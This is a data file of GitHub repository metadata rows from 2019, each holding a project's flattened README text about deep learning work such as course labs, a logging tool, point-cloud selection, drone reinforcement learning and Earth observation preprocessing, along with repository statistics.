communities of Mozilla Common Voice and MyCroft Mimic Especially to Lindsay Saunders Mozilla for nice contact and eltocino gras64 dominik from the MyCroft community for the patience to patiently answer my beginner questions Mimic analyse py results after 5k spoken phrases charlenvsavgsecs img 5000phrasescharlenvsavgsecs png raw true charlenvsavgsecs charlenvsmedsecs img 5000phrasescharlenvsmedsecs png raw true charlenvsmedsecs charlenvsmodesecs img 5000phrasescharlenvsmodesecs png raw true charlenvsmodesecs charlenvsnumsamples img 5000phrasescharlenvsnumsamples png raw true charlenvsnumsamples charlenvsstd img 5000phrasescharlenvsstd png raw true charlenvsstd Links https voice mozilla org https github com mozilla CorporaCreator https raw githubusercontent com mozilla voice web master server data de sentence collector txt https community mycroft ai https github com MycroftAI mimic2 https github com MycroftAI mimic recording studio https github com gras64 corpus file gen,2019-10-29T17:52:17Z,2019-12-09T09:40:25Z,n/a,thorstenMueller,User,2,3,0,12,master,thorstenMueller,1,0,0,0,0,0,0
yanneta,deep-learning-nlp,n/a,deep learning nlp Repo for the course Deep Learning for NLP This course was taught at University of Havana Syllabus subject to change Lesson 1 review of machine learning intro to pytorch Lesson 2 Word Embeddings and CBOW model for classification Lesson 3 Recurrent neural networks and seq2seq networks Lesson 4 Seq2seq with attention Lesson 5 NLP applications Questions answering Text summarization Chatbots Lesson 6 image captioning BERT transformers,2019-09-26T18:20:04Z,2019-11-26T05:18:47Z,Jupyter Notebook,yanneta,User,1,3,0,1,master,yanneta,1,0,0,0,0,0,0
ChrisHuie,ASUTalkDeepLearningWithGames,n/a,Deep Learning with Retro Video Games Video games are one of the most exciting environments for the future of machine learning Specifically reinforcement learning models that learn through interacting with their environment have found a true training and testing ground in the world of video games This is because reinforcement learning unlike other areas of machine learning is focused solely on a reward signal and maximizing a specific reward function So we will first look at some of the recent accomplishments and talk about deep reinforcement learning at the highest levels of engineering like AlphaStar and OpenAi Five Then we will get hands on and look at creating our own deep reinforcement learning agents using OpenAI s Gym Retro environment This talk will show you how to setup your learning environment introduce you to using convolutional neural networks inputs for your model to read the screen and show you how to build your first deep reinforcement learning model that learns to play a level in Sonic the Hedgehog 2 and other retro video games,2019-09-21T17:51:00Z,2019-11-08T01:39:00Z,Jupyter Notebook,ChrisHuie,User,1,3,1,7,master,ChrisHuie,1,0,0,0,0,0,0
DumitruHanciu,DeeplearneR,n/a,DeeplearneR Deep Learning models for image classification based on Convolutional Neural Networks with 92 accuracy ResNet Detailed Convolutional Neural Network model as application of Deep Learning in the context of Computer Vision and image recognition using Keras TensorFlow For faster and more acurate learning and prediction processes I have applied a bunch of optimizations As additions to that there are also packages for Softmax Regression Multilayer Peceptron as well as the fastest and most accurate ResNet model based on Cifra10 dataset On my machine GPU usage helps reduce training period more than 20x which would take arround 4 hours for 150 epochs Demo ResNet Performance Package Convolutional Neural Networks ResNets Multilayer Perceptrons SoftMax Regressors Optimizations Adam or SGD optimizer Regularization Data augmentation Batch Normalization Strided Convolutions Global Pooling Learning Rate Decay Usage CNN model training is done as follows From the outside path of the project directory use arguments b s or p for batchnormalization strided convolutions or pooling and start training shell C DeeplearneR cd C python m DeeplearneR src cnn s ResNet model training is done as follows From the outside path of the project directory use argument a to enable Data Augmentation and start training shell C DeeplearneR cd C python m DeeplearneR src resnet a How to Contribute 1 Clone repo and create a new branch git checkout https github com DumitruHanciu DeeplearneR b newbranch 2 Make changes and test 3 Submit Pull Request with comprehensive description of changes License License http img shields io license mit blue svg style flat square http badges mit license org MIT license http opensource org licenses mit license php,2019-10-01T10:12:15Z,2019-11-14T21:47:43Z,Python,DumitruHanciu,User,1,3,0,0,master,,0,0,0,0,0,0,0
HaotianXue,Deep_Relation_Extraction,n/a,DeepRelationExtraction Author Haotian Xue Supervisor Prof Dongwoo Kim http dongwookim ml github io Extract relation within unstructured sentence by using deep learning models A relation knowledge graph is consisted of directed graph where a node is a triple entity1 relation entity2 Relation extraction task is to predict the relation between two entities within a sentence or a paragraph This project uses supervised learning and distant supervision learning to train deep relation extraction model Three models are implemented CNN with position embedding LSTM with attention and Multi head self attention Supervised learning 1 CNN word embedding position embedding CNN feed forward neural network 2 RNN word embedding position embedding LSTM word level attention feed forward neural network 3 Attention model word embedding position embedding Multi head self attnetion encoder word level attention feed forward neural network Distant supervision 1 CNN word embedding position embedding CNN word level attention sentence level attention feed forward neural network 2 RNN word embedding position embedding LSTM word level attention sentence level attention feed forward neural network 3 Attention model word embedding position embedding Multi head self attnetion encoder word level attention sentence level attention feed forward neural network Model Layout CNN img baselinecnn jpg RNN img basecnn jpg Attention img mutlihead jpg Training Loss img mhloss png,2019-10-03T20:01:01Z,2019-12-11T13:00:02Z,Python,HaotianXue,User,1,3,0,10,master,HaotianXue,1,0,0,0,0,0,0
cnzhanj,DML-DDL-Paper-List,n/a,DML DDL Paper List Distributed Machine Learning Distributed Deep Learning Paper List,2019-10-10T03:12:00Z,2019-11-22T03:09:58Z,n/a,cnzhanj,User,1,3,0,9,master,cnzhanj,1,0,0,0,0,0,0
NVIDIA,dllogger,n/a,DLLogger for Python DLLogger minimal logging tool This project emerged from the need for a unified logging schema for Deep Learning Example modules It provides a simple extensible and intuitive logging capabilities with API trimmed to an absolute minimum Table Of Contents Installation installation Quick Start Guide quick start guide Available backends overview available backends overview StdOutBackend stdoutbackend JSONStreamBackend jsonstreambackend Advanced usage advanced usage Multiple loggers multiple loggers Installation To install DLLogger run bash pip install dllogger Quick Start Guide To start using DLLogger add the following two lines of code to your DL training script python from dllogger import StdOutBackend JSONStreamBackend Verbosity import dllogger as DLLogger DLLogger init backends StdOutBackend Verbosity DEFAULT JSONStreamBackend Verbosity VERBOSE log json To log data call DLLogger log step data verbosity Where can be any number string tuple which would indicate where are we in the training process Use step PARAMETER for script parameters everything that is needed to reproduce the result Use a tuple of numbers to indicate the training progress for example step tuple epochnumber iterationnumber validationiterationnumber for a validationiterationnumber in a validation that happens after iteration iterationnumber of epoch epochnumber step tuple epochnumber for a summary of epoch epochnumber step tuple for a summary of the entire training should be a dictionary with metric names as keys and metric values as values To log metric metadata for example unit description ordering and format call DLLogger metadata metricname metricmetadata where metricmetadata is a dictionary Backends can use the metadata information for logging purposes for example StdOutBackend uses the format and unit fields to format its output The log is automatically saved on the exit of the Python process with exception of processes killed with SIGKILL To flush the log file before training ends run DLLogger flush For usage examples refer to the examples dlloggerexample py and examples dlloggersingletonexample py files Available backends overview DLLogger can use multiple backends for logging for example with one logging call the logged data can be saved or printed in multiple formats StdOutBackend A vanilla backend that holds no buffers and that prints the provided values to stdout python StdOutBackend verbosity stepformat metricformat Where stepformat is a function that formats step in the DLLogger log call metricformat is a function that formats a metric name and value given its metadata For more information see the default format functions in the dllogger logger py script For example output refer to the examples stdout txt file JSONStreamBackend This backend saves JSON formatted lines into a file adding time stamps for each line python JsonBackend verbosity filename For example output refer to the examples dummyresnetlog json file Advanced usage By default DLLogger takes advantage of the singleton pattern It is possible to obtain a logger instance without referencing the DLLogger global instance for example to create multiple and different logs from one script python from dllogger import Logger logger Logger backends BACKENDLIST,2019-10-17T16:29:19Z,2019-11-14T14:54:12Z,Python,NVIDIA,Organization,3,3,0,0,master,,0,0,0,0,0,0,0
chenjun2hao,Flask_UI_Pytorch,deep-learning#flask#ui,FlaskUI python flaskwebwebpytorch https github com avinassh pytorch flask api heroku 1 2 3 htmljava 1 python python f request files file file request files get file html formmethodposdenctypemutipart form data inputnamepythonrequest files file python userinput request form get name requestform html 2 javascript javascript let fileObj this files 0 let fileReader new FileReader fileReader readAsDataURL fileObj onload img fileReader onload function myfile attr src fileReader result index html 3 1 pytorch tensorflowhtmlsrc 2 html 1 Flask https blog csdn net dcrmg article details 81987808,2019-10-22T10:25:03Z,2019-11-28T10:02:05Z,HTML,chenjun2hao,User,1,3,0,2,master,chenjun2hao,1,0,0,0,0,0,0
lassonet,lassonet,n/a,LassoNet Deep Lasso Selection of 3D Point Clouds Citation If you find our work useful in your research please consider citing articlechen2019b title LassoNet Deep Lasso Selection of 3D Point Clouds author Chen Zhutian and Zeng Wei and Yang Zhiguang and Yu Lingyun and Fu Chi Wing and Qu Huamin journal IEEE Transactions on Visualization and Computer Graphics year 2019 volume number pages 1 1 Introduction This project based on our IEEE VIS 19 paper aims at learning a latent mapping from viewpoint and lasso to point cloud regions using a deep learning model This project is builted based on pointnet https github com charlesq34 pointnet pointnet https github com charlesq34 pointnet2 You can also check our project webpage https lassonet github io for more details In this repository we release code and data for training the deep learning model in our method Installation Install TensorFlow The code is tested under TF1 12 GPU version and Python 3 6 on Ubuntu 16 04 There are also some dependencies for a few Python libraries for data processing like h5py etc Compile Customized TF Operators The TF operators are included under tfops you need to compile them check tfxxxcompile sh under each ops subfolder first Update nvcc and python path if necessary The code is tested under TF1 12 0 If you are using earlier version it s possible that you need to remove the DGLIBCXXUSECXX11ABI 0 flag in g command in order to compile correctly To compile the operators in TF version 1 4 you need to modify the compile scripts slightly First find Tensorflow include and library paths TFINC python c import tensorflow as tf print tf sysconfig getinclude TFLIB python c import tensorflow as tf print tf sysconfig getlib Then add flags of I TFINC external nsync public L TFLIB ltensorflowframework to the g commands Dataset The selection datasets on ShapeNet d1 https hkustconnect my sharepoint com u g personal zchenbnconnectusthk EbA6lKsGIJ9OnXpcosV3TnEBzH84 AKzGimMGPEmVuIiRA e fFatzD The selection datasets on S3DIS d2 https hkustconnect my sharepoint com u g personal zchenbnconnectusthk EU34qjiMZRdPmPgy5U7OICYBwmcNfj1VVBET6ZEOELidA e o1tFnr Please unarchive and put all the files in the data folder Usage To train a model for dataset d1 on multiple GPUs CUDAVISIBLEDEVICES 0 1 python d1 trainc py config d1 config s0np2048pn yaml After training to evaluate the result please add a OUTPUTPATH in the same config file pointing to the log folder of the trained model and then run CUDAVISIBLEDEVICES 0 1 python d1 testc py config d1 config s0np2048pn yaml To train a model for dataset d2 on multiple GPUs CUDAVISIBLEDEVICES 0 1 python d2 trainc py config d2 config s1np20480r0 0mng4096 yaml After training to evaluate the result please add a OUTPUTPATH in the same config file pointing to the log folder of the trained model and then run CUDAVISIBLEDEVICES 0 1 python d2 testc py config d2 config s1np20480r0 0mng4096 yaml Note The code in this repo is under active development License Our code is released under MIT License see LICENSE file for details,2019-10-14T13:17:24Z,2019-11-03T13:54:33Z,Python,lassonet,Organization,1,3,0,7,master,chenzhutian,1,0,0,0,0,0,0
ESA-PhiLab,eo4ai,n/a,WORK IN PROGRESS EO4AI Build Status https travis ci org ESA PhiLab eo4ai svg branch master https travis ci org ESA PhiLab eo4ai Earth Observation preprocessing tools for AI and machine learning applications This project provides easy to use tools for preprocessing datasets for image segmentation tasks in Earth Observation We hope to remove the barrier to entry for data scientists in EO by reducing the amount of time spent on reformatting datasets These EO datasets are frequently characterised by very large image formats high bit depths non standard label formats pixel values in Digital Number varied naming conventions and other dataset specific peculiarities which slow down development of AI applications This package aims to provide users with a pre prepared dataset ready immediately for AI Deep Learning applications The processed datasets are all Normalised to reflectance values Resampled to the same resolution Split into smaller images for quicker read times Transformed into one hot encoded masks Organised into simple directory tree structure Documented with useful metadata and command for replication Cloud Masking datasets Landsat 8 Biome link https landsat usgs gov landsat 8 cloud cover assessment validation data USGS 2016 96 manually annotated Landsat 8 scenes 8k by 8k pixels from 8 different terrain types biomes Data provided at 30m res for all bands Landsat 8 SPARCS link https www usgs gov land resources nli landsat spatial procedures automated removal cloud and shadow sparcs validation USGS 2016 80 manually annotated cropped Landsat 8 scenes 1k by 1k pixels Data provided at 30m resolution but does not include sharper Panchromatic band Landsat 7 Irish link https landsat usgs gov landsat 7 cloud cover assessment validation data USGS 2016 206 manually annotated Landsat 7 scenes from a diverse range of latitudes Data provided at nominal Landsat 7 resolution Sentinel 2 ALCD link https zenodo org record 1460961 XYCTRzYzaHt Baetens et al 2018 38 Sentinel 2 scenes annotated through an active learning system Data provided in native band resolutions 10m 60m Does not include the parent scenes only the masks Therefore we include a download tool to retrieve the relevant scenes from the Copernicus Open Access Hub for which a username and password is needed Credits and Contributions Please use these tools freely in your work Give this repository an acknowledgement and always credit and cite the datasets creators who have put a huge amount of work into these labelled datasets If you have a dataset that you think would be a good fit or would like to contribute to the repository please post an issue send a PR or just get in touch,2019-10-16T13:47:29Z,2019-12-11T12:15:54Z,Jupyter Notebook,ESA-PhiLab,Organization,4,3,1,94,master,aliFrancis#JohnMrziglod,2,0,0,2,1,0,6
aqeelanwar,DRLwithTL_real,n/a,Deep Reinforcement Learning with Transfer Learning DJI Tello Drone and Real Environment DRLwithTL Real What is DRLwithTL Real This repository uses Transfer Learning TL based approach to reduce on board computation required to train a deep neural network for autonomous navigation via Deep Reinforcement Learning for a target algorithmic performance A library of 3D realistic meta environments is manually designed using Unreal Gaming Engine and the network is trained end to end These trained meta weights are then used as initializers to the network in a real test environment and fine tuned for the last few fully connected layers Variation in drone dynamics and environmental characteristics is carried out to show robustness of the approach The repository containing the code for simulated environment on a simulated drone can be found DRLwithTL Sim https github com aqeelanwar DRLwithTL Cover Photo images tello png Cover Photo images cover png Installing DRLwithTL Sim The current version of DRLwithTL Sim supports Windows and requires python3 Its advisable to make a new python virtual environment https towardsdatascience com setting up python platform for machine learning projects cfd85682c54b for this project and install the dependencies Following steps can be taken to download get started with DRLwithTL Real Clone the repository git clone https github com aqeelanwar DRLwithTLreal git Install required packages The provided requirements txt file can be used to install all the required packages Use the following command cd DRLwithTLreal pip install r requirements txt This will install the required packages in the activated python environment Running DRLwithTL Real Once you have the required packages you can take the following steps to run the code Connect with DJI Tello 1 Turn DJI Tello On 2 Connect your workstation with DJI Tello over Wi Fi Modify the configuration file Optional The RL parameters for the DRL algorithm can be set using the provided config file and are self explanatory cd DRLwithTLrealconfigs notepad config cfg for windows Run the Python code The DRL code can be started using the following command cd DRLwithTL python maincode py While the simulation is running RL parameters such as epsilon learning rate average Q values and loss can be viewed on the tensorboard The path depends on the envtype envname and traintype set in the config file and is given by DeepNet models ltrunname ltenvtype An example can be seen below cd DeepNet models Telloindoor VanLeer tensorboard logdir agent Runtime Controls Pygame screen can be used to control the DJI Tello drone on the fly Following control keys are supported 1 M Top toggle between automatic and manual mode In automatic phase the drone uses RL training to navigate around the environment using epsilon greedy algorithm In manual phase default starting phase the user has control over the drone and can use left right up down w a s d keys to navigate All the other control keys mentioned below only works when the drone is in the manual mode 2 Escape Quits the code 3 L Save the DNN weights and Replay memory to the path specified in the config file Citing If you find this repository useful for your research please use the following bibtex citations ARTICLE2019arXiv191005547A author Anwar Aqeel and Raychowdhury Arijit title Autonomous Navigation via Deep Reinforcement Learning for Resource Constraint Edge Nodes using Transfer Learning journal arXiv e prints keywords Computer Science Machine Learning Statistics Machine Learning year 2019 month Oct eid arXiv 1910 05547 pages arXiv 1910 05547 archivePrefix arXiv eprint 1910 05547 primaryClass cs LG adsurl https ui adsabs harvard edu abs 2019arXiv191005547A adsnote Provided by the SAO NASA Astrophysics Data System articleyoon2019hierarchical title Hierarchical Memory System With STT MRAM and SRAM to Support Transfer and Real Time Reinforcement Learning in Autonomous Drones author Yoon Insik and Anwar Malik Aqeel and Joshi Rajiv V and Rakshit Titash and Raychowdhury Arijit journal IEEE Journal on Emerging and Selected Topics in Circuits and Systems volume 9 number 3 pages 485 497 year 2019 publisher IEEE Authors Aqeel Anwar https www prism gatech edu manwar8 Georgia Institute of Technology License This project is licensed under the MIT License see the LICENSE md LICENSE file for details,2019-10-16T18:16:36Z,2019-12-12T04:59:04Z,Python,aqeelanwar,User,2,3,1,4,master,aqeelanwar#dependabot[bot],2,0,0,0,0,1,2
yqtianust,awesome-ml-testing,awesome#deep-learning#machine-learning#testing,awesome ml testing Awesome material papers tools etc about testing machine learning system including deep learning system This repo will be updated continuously don t hesitate to add new Pull Request or Issues if you find anything is missing Please use the format here format Web page for paper list in ONLINE https yqtianust github io awesome ml testing Thanks to Troublor https github com Troublor Table of Contents Tools tools Papers papers Talks talks Free GPU Resources GPU Format This repo use a specific format When you open a new issues you will find the template For tools Project Name A short description please add the related paper if this tool is from academic paper For paper Paper Name Author s Name s Conference Journal name A short description Tools EvalDNN EvalDNN A Toolbox for Evaluating Deep Neural Network Models Benchmark https yqtianust github io EvalDNN benchmark index html MuDNN MMdnn is a set of tools to help users inter operate among different deep learning frameworks E g model conversion and visualization Convert models between Caffe Keras MXNet Tensorflow CNTK PyTorch Onnx and CoreML AIF360 A comprehensive set of fairness metrics for datasets and machine learning models explanations for these metrics and algorithms to mitigate bias in datasets and models sotabench A free benchmarking service for all open source ML repositories You can submit your model and this web will run it against some benchmakrs Paper with Code A website contains evalution results reported in DL ML papers as well as their code if any Note the code could be implemented by 3rd party Papers See Paper List http www victortian com awesome ml testing Thanks to Troublor https github com Troublor A Study of Oracle Approximations in Testing Deep Learning Libraries Mahdi Nejadgholi Jinqiu Yang ASE 19 An Empirical Study towards Characterizing Deep Learning Development and Deployment across Different Frameworks and Platforms Qianyu Guo Sen Chen Xiaofei Xie Lei Ma Qiang Hu Hongtao Liu Yang Liu Jianjun Zhao Li Xiaohong ASE 19 Apricot A Weight Adaptation Approach to Fixing Deep Learning Models Hao Zhang Wing Kwong Chan ASE 19 AutoFocus Interpreting Attention based Neural Networks by Code Perturbation Nghi Duy Quoc Bui Yijun Yu Lingxiao Jiang ASE 19 Automating CUDA Synchronization via Program Transformation Mingyuan Wu Lingming Zhang Cong Liu Shin Hwei Tan Yuqun Zhang ASE 19 Property Inference for Deep Neural Networks Divya Gopinath Hayes Converse Corina S Pasareanu Ankur Taly ASE 19 Wuji Automatic Online Combat Game Testing Using Evolutionary Deep Reinforcement Learning Yan Zheng Xiaofei Xie Ting Su Lei Ma Jianye Hao Zhaopeng Meng Yang Liu Ruimin Shen Yinfeng Chen Changjie Fan ASE 19 ABS Scanning Neural Networks for Back doors by Artificial Brain Stimulation Yingqi Liu Wen Chuan Lee Guanhong Tao Shiqing Ma Yousra Aafer Xiangyu Zhang CCS 19 Talks 1 TODO Courses CS 590 Program Analysis For Deep Learning at Purdue University by Xiangyu Zhang http xyz wiki cs purdue edu cs590 19f doku php id home Free GPU Resources Google Colab Paperspace gradient,2019-09-23T16:07:07Z,2019-11-17T05:39:18Z,n/a,yqtianust,User,2,3,0,33,master,Troublor#yqtianust#t94126,3,0,0,0,2,0,0
arpit1991dubey,AI_Projects,n/a,AIProject HitCount http hits dwyl io https githubcom arpit1991dubey https githubcom arpit1991dubey AIProjects svg http hits dwyl io https githubcom arpit1991dubey https githubcom arpit1991dubey AIProjects Diabetes On set Detection Using Deep Learning And Grid Search Mechanism This Project uses Deep Learnig Working On Neural Network Model To Predict The Diabetes Or Any Symptoms Of Diabetes And Clasifies Them Into class 0 and 1 Where Class 1 Singnifies Prone To Diabetes and Class 0 Signifies Not Prone To Diabetes This Prediction is based on the 7 Parameters Taken Under Consideration while Fetching The data The Grid Search Mecahnism Is Found To Be Very Efficient Here And When Applied Gives A Very Promising Accuracy Percentage The Folder Conatins Dataset Taken From Kaggle Provided By UCI machine learning repository,2019-10-23T15:19:06Z,2019-11-30T05:09:42Z,Python,arpit1991dubey,User,1,3,0,10,master,arpit1991dubey,1,0,0,0,0,0,0
rishabhgarg7,Face-Alignment,n/a,Face Alignment Implementation of paper titled Facial Landmark Detection by Deep Multi task Learning http personal ie cuhk edu hk ccloy files eccv2014deepfacealign pdf in keras,2019-10-28T07:08:21Z,2019-10-31T06:07:01Z,Jupyter Notebook,rishabhgarg7,User,0,3,2,7,master,rishabhgarg7,1,0,0,0,0,0,0
M3nin0,ICan.js,assistive-technology#deep-learning#tfjs,ICan js tophat pipeline status https gitlab com ican js ican js badges master pipeline svg https gitlab com ican js ican js commits master docs status https icanjs netlify com docs badge svg https icanjs netlify com docs source html logoicanjs https icanjs netlify com static img paginagitlab png ICan js uma biblioteca criada para disponibilizar recursos assistivos em pginas da web atravs da aplica o de tcnicas de Aprendizado Profundo Atualmente o ICan js disponibiliza funcionalidades para o controle de pginas web atravs de gestos com a cabea e escrita de textos com gestos de Libras Este um repositrio de apresenta o para visualizar o repositrio de desenvolvimento acesse https gitlab com ican js ican js Arquitetura do projeto constructionworker A biblioteca dividida em duas camadas de funcionalidades estas criadas sob as funcionalidades do Tensorflow js A Figura abaixo apresenta as camadas da biblioteca arquiteturaicanjs https icanjs netlify com static img arquiteturaicanjs2 jpeg Veja que a camada Core possui as funcionalidades principais da biblioteca os modelos de rede neural e de regress o e a camada Common consome as funcionalidades da camada Core e cria os recurso assistivos Utiliza o spaceinvader A ideia da biblioteca foi criar uma forma simples de aplicar tcnicas de Deep Learning no desenvolvimento de recursos assistivos Ent o para utilizar as funcionalidades desenvolvidas na biblioteca basta importar o arquivo compilado icjs js https icanjs netlify com res icjs js em suas pginas html html Insira seus cdigos de utiliza o da biblioteca aqui Para demonstrar o uso da biblioteca foram criados alguns exemplos de utiliza o consulte o repositrio https gitlab com ican js examples de exemplos ou acesse diretamente os exemplos que est o online estes listados abaixo Controle de mouse com a cabea https icanjs examples netlify com controle de mouse Escrita de texto utilizando gestos de Libras https icanjs examples netlify com escrita de texto Documenta o notebookwithdecorativecover A documenta o do projeto est disponvel aqui https icanjs netlify com docs Colaborando balloon O ICan js ainda est em desenvolvimento ent o caso voc queira ajudar abra issues das melhorias que voc acha importante que podemos ir conversando e programando novas funcionalidades,2019-09-25T11:48:22Z,2019-11-10T18:48:21Z,JavaScript,M3nin0,User,1,3,0,45,master,M3nin0,1,0,1,0,0,0,0
TensorTorrent,TensorTorrent,n/a,TensorTorrent An Open Source Deep Learning Framework with In Memory Computing Acceleration,2019-10-06T06:08:29Z,2019-11-20T12:47:21Z,C++,TensorTorrent,User,2,3,0,63,master,TensorTorrent,1,0,0,0,0,0,0
geonm,tf_SoftTriple_loss,n/a,,2019-09-25T11:39:44Z,2019-10-24T01:55:35Z,Python,geonm,User,1,3,0,4,master,geonm,1,0,0,0,0,0,0
sid-7,Knee-Damage-Detector,n/a,Knee Damage Detector The Project mainly focuses on detecting the damage level in KL grade of the knee using deep learning models,2019-09-29T19:59:38Z,2019-11-09T08:06:50Z,Java,sid-7,User,1,3,0,4,master,sid-7,1,0,0,0,0,0,0
vanAmsterdam,elimbias,n/a,Eliminating Biasing Signals in Lung Cancer Images for Prognosis Predictions with Deep Learning This repository contains the necessary files to reproduce the results of paper Eliminating Biasing Signals Lung Cancer Images for Prognosis Predictions with Deep Learning by W A C van Amsterdam J J C Verhoeff P A de Jong T Leiner and M J C Eijkemans in Nature Digital Medicine 2019 Replicating the experiments See this release for the code that generated the published results DOI https zenodo org badge DOI 10 5281 zenodo 3522229 svg https doi org 10 5281 zenodo 3522229 Please follow these steps to replicate the results as published The original python scripts are somewhat self explanatory They do contain unused code that was useful during initial experiments but was not used for the final publication Installation The easiest way to go about this is to create a new conda environment and install all dependencies using conda and pip conda create name elimbias conda activate elimbias conda install python 3 7 3 tqdm numpy pandas feather format nibabel pillow scikit learn tensorboard future seaborn conda install c pytorch pytorch 1 1 0 torchvision pip install pyro ppl 0 3 0 pypng pylidc Pre processing Go to subfolder elimbias preproces follow steps in README there The goal of these steps is to end up with a collection of images that are neural network ready and each have associated measurements e g size and variance that can be used in a structural causal model The result is a data folder that contains the images separated in train valid subfolders test is optional but not default with associated measurements in a labels csv file Data simulation This is where the statistical association between the images and the clinical data are simulated based on a structural causal model and the measurements of the images 1 Define a structural causal model that will generate the data See experiments sims README md for a short instruction to define a structural causal model See experiments sims for an example csv file that defines a structural causal model 2 Define a setting in the settings directory with a setting json file that together with the structural causal model defines the experiment see the example 3 After defining the SCM and setting run simulatedata py to create a dataset based on the SCM and sample images accordingly for the defined setting like so python simulatedata py setting run without the setting argument to replicate the published results using the default setting This will create a data folder in the setting mysetting folder Here are the images stored coupled with the simulated ground truth data that will be used for training and validation Running the models To replicate run python train py To run on your own simulated data python train py setting To evaluate the CNNs ability to predict the ground truth measurements run with python train py setting fase feature Result will be saved in the setting directory with subfolders for each fase xybn predict x y and use bottleneck loss feature predict features experiments basemodel params json experiments basemodel params json contains the hyperparameters that controls how train py runs Evaluation Run Tensorboard in this directory for visualization of the results,2019-10-29T14:22:24Z,2019-12-12T09:46:06Z,Python,vanAmsterdam,User,1,3,1,2,master,vanAmsterdam,1,1,1,0,0,0,0
GitiHubi,courseMLDL,artificial-intelligence#deep-learning#machine-learning,Introduction into Machine Learning and Deep Learning ML DL License GPL v3 https img shields io badge License GPLv3 blue svg Course Banner https github com GitiHubi courseAIML blob master banner png A series of interactive lab notebooks we prepared for the Introduction into Machine Learning and Deep Learning course The content of the series is based on Python IPython Notebook and PyTorch Cloning the repository to Azure Notebooks Azure Notebooks https notebooks azure com launch png https notebooks azure com import gh GitiHubi courseMLDL This is currently work in progress so expect minor errors and some rough edges Running the Lab Notebooks Lab 00 Testing the Lab Environment Open In Colab https colab research google com assets colab badge svg https colab research google com github GitiHubi courseMLDL blob master lab01 mldllab00 ipynb Lab 01 Introduction to the Lab Environment Open In Colab https colab research google com assets colab badge svg https colab research google com github GitiHubi courseMLDL blob master lab01 mldlcolab01 ipynb Lab 02 Fundamentals of Python Programming Open In Colab https colab research google com assets colab badge svg https colab research google com github GitiHubi courseMLDL blob master lab02 mldlcolab02 ipynb Lab 03 Supervised Machine Learning Open In Colab https colab research google com assets colab badge svg https colab research google com github GitiHubi courseMLDL blob master lab03 mldlcolab03 ipynb Lab 04 Unsupervised Machine Learning Open In Colab https colab research google com assets colab badge svg https colab research google com github GitiHubi courseMLDL blob master lab04 mldlcolab04 ipynb Lab 05 Supervised Deep Learning ANNs CPU Open In Colab https colab research google com assets colab badge svg https colab research google com github GitiHubi courseMLDL blob master lab05 mldlcolab05 ipynb GPU Open In Colab https colab research google com assets colab badge svg https colab research google com github GitiHubi courseMLDL blob master lab05 mldlcolab05gpu ipynb Lab 06 Supervised Deep Learning CNNs CPU Open In Colab https colab research google com assets colab badge svg https colab research google com github GitiHubi courseMLDL blob master lab06 mldlcolab06 ipynb GPU Open In Colab https colab research google com assets colab badge svg https colab research google com github GitiHubi courseMLDL blob master lab06 mldlcolab06gpu ipynb Getting Started Install dependencies via pip install r requirements txt Questions,2019-09-23T09:06:41Z,2019-12-03T14:01:25Z,Jupyter Notebook,GitiHubi,User,1,3,1,27,master,GitiHubi,1,0,0,0,0,0,0
dinhvietcuong1996,Lab-DeepLearningCourse,n/a,Description y l repo cha bi thc hnh mn My hc n ng cao c dy khoa Ton Tin trng i hc Khoa hc T nhin TP H Ch Minh hc k 1 nm hc 2019 2020 Mc tiu Hiu c cc cu trc mng n ron thng qua thc hnh lp trnh S dng th vin Tensorflow Keras API Ci t hun luyn v s dng cc model deep learning Framework S dng ngn ng Python vi th vin tensorflow v keras Chy trn Google Colab hoc cc notebook online cloud h tr chy machine learning khc Yu cu Sinh vin bit c bn python v th vin numpy Hnh thc Mi tun s c mt bi thc hnh lm trong mt tun Cc bi thc hnh s c cung cp code mu Sinh vin c yu cu ty chnh vit thm da vo code mu im Cc bi thc hnh u c im nh nhau Hon thnh ht cc bi phn thc hnh mi c ti a im phn thc hnh Hon thnh tt cc yu cu ca bi thc hnh mi c ti a im Tng im phn thc hnh l 3 im Np bi Bi np gm mt file nn tn AML Lab rar cha file notebook ipynb v mt file pdf in kt qu chy ca notebook c th dng chc nng Print ca trnh duyt ch cn trong file pdf c code v kt qu chy Bi thc hnh c gi qua email dinhvietcuong1996 gmail com Email np c tiu AML Lab sinh vin np sai tiu rt kh tm ra S khng c email xc nhn np bi,2019-10-08T14:06:00Z,2019-12-13T09:25:00Z,Jupyter Notebook,dinhvietcuong1996,User,1,2,7,28,master,dinhvietcuong1996,1,0,0,0,0,0,0
amir-jafari,Deep-Learning,n/a,Basic Codes to Learn Different Frameworks Guide Torch In this folder Lua examples and exercises are shown There are class example codes beside some helpful exercises Also torch examples on Neural Network and how to create a deep networks added Caffe Tensorflow Theano Pytorch,2019-10-10T19:13:18Z,2019-12-04T17:34:38Z,Python,amir-jafari,User,1,2,6,50,master,amir-jafari,1,0,0,0,0,0,0
Deep-Learning-courses,courses_labs,n/a,Engineering schools Deep Learning courses and labs Courses and labs will be added and updated in weeks please be sure to pull frequently Outline of the class Week 1 Machine Learning reminders https deep learning courses github io courseslabs 1 MLreminders index html Week 2 The fundamentals of Neural Networks https deep learning courses github io courseslabs 2 FundamentalsNNs index html Week 3 Convolutional Neural Networks https deep learning courses github io courseslabs 3 CNN index html Week 4 Deep Learning for Natural Language Processing Part 1 https deep learning courses github io courseslabs 4 DeepLearningNLP1 index html Week 5 Deep Learning for Natural Language Processing Part 2 https deep learning courses github io courseslabs 5 DeepLearningNLP2 index html Lab requirements Binder https mybinder org badgelogo svg https mybinder org v2 gh Deep Learning courses courseslabs gh pages Python version 3 7 3 Pip version 19 1 1 Please be sure your Python packages are up to date by running the following command pip install Ur requirements txt,2019-09-29T15:17:52Z,2019-12-09T17:01:58Z,Jupyter Notebook,Deep-Learning-courses,Organization,1,2,11,52,gh-pages,yoh2292#Dalkio,2,1,1,0,0,0,0
Fijiisland,Cell_DeepLearning,cplusplus#deep-learning#gui#qt,CellDeepLearning READMECN md A Qt Based Project This is originally a college students innovation project then we decided to go further more to make it stronger We re developing a universal deeplearning library and we call it CELL As you see we aim to build a good interactive user interface Note that CELL imports an open source text editor QScintilla which s a transported version of the original Scintilla editor for windows Qt owned by Riverbank Computing Limited here s their official website We very appreciate about Riverbank s production because QScintilla works very well Compile Go to page and download QScintilla for windows After unarchiving the QScintilla source package enter its child directory Qt4Qt5 then double click project file QScintilla pro Qt will load the QScintilla source automaticly choose the MinGW 32 bit toolchain and compile debug version and release version respectively After that you will get two dynamic link libraries qscintilla2qt5 dll qscintilla2qt5d dll they correspond to debug mode and release mode respectively Almost done put the two dlls to a protable directory and add them into cell s pro file to compile License The GNU License Contribution If you have any ideas or suggestions welcome to 